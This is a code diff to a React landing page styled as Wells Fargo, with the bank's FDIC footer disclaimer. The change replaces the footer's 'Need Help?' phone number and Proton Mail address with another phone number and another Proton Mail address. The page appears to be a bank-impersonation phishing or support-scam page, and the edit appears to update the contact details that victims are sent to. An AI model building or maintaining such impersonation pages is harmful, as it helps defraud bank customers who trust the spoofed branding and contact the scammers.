@@ -109,8 +109,8 @@ export default function LandingPage() {
       <div className="bottom-footer">
         <div style={{ marginBottom: '16px', fontSize: '13px', color: '#333' }}>
           <strong>Need Help?</strong> <br />
-          Call: +1 (518) 253-5015 <br />
-          Email: wellsfargo.org@proton.me
+          Call: +1 786-872-0946 <br />
+          Email: onlinefeedbackwellsfargo.org@proton.me
         </div>
         Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
       </div>
